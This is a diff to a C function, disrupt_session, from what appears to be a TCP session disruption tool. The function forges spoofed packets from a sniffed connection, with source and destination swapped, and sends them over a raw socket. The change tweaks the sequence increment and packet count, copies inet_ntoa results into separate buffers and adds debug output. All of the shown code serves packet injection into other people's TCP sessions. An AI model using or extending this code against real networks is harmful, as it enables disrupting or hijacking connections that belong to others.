@@ -90,7 +90,7 @@ void disrupt_session(void *sniffedPacket) {
     int sizeOfPacket            = sizeof(struct iphdr) + sizeof(struct tcphdr) + 12 + 1;
     void *packet                = malloc(sizeOfPacket);
     uint32_t ack_inc            = 1;       // Amount to increase ack by
-    uint32_t seq_inc            = 1;       // Amount to increase seq by
+    uint32_t seq_inc            = 0;       // Amount to increase seq by
     int sock                    = -1;       // Socket FD
     int one                     = 1;        // ??????????????
 
@@ -132,10 +132,22 @@ void disrupt_session(void *sniffedPacket) {
     printf("\"data\":\"%s\"",       "X");
     printf("}\n\n");
 
-    int packetCountdown = 5;
+    int packetCountdown = 1;
     while(packetCountdown--){
-        fill_packet(inet_ntoa(ipHeader->ip_dst),            // Source IP Address
-                    inet_ntoa(ipHeader->ip_src),            // Destination IP Address
+
+        char *dstTemp = inet_ntoa(ipHeader->ip_dst);
+        char *dstAddress = malloc(strlen(dstTemp) + 1);
+        strncpy(dstAddress, dstTemp, strlen(dstTemp) + 1);
+
+        char *srcTemp = inet_ntoa(ipHeader->ip_src);
+        char *srcAddress = malloc(strlen(srcTemp) + 1);
+        strncpy(srcAddress, srcTemp, strlen(srcTemp) + 1);
+
+        printf("filling with ipHdr->saddr = %s\n", dstAddress);
+        printf("filling with ipHdr->daddr = %s\n", srcAddress);
+
+        fill_packet(dstAddress,                             // Source IP Address
+                    srcAddress,                             // Destination IP Address
                     ntohs(tcpHeader->source),               // Destination Port
                     ntohs(tcpHeader->dest),                 // Source Port
                     SYN_OFF,                                // SYN Flag
@@ -150,5 +162,8 @@ void disrupt_session(void *sniffedPacket) {
 
         // Send out the packet
         printf("Sending Packet %02d of %02d! Result: %d\n", 6-packetCountdown, 5, send_packet(sock, packet, addr_in));
+
+        free(dstAddress);
+        free(srcAddress);
     }
 }
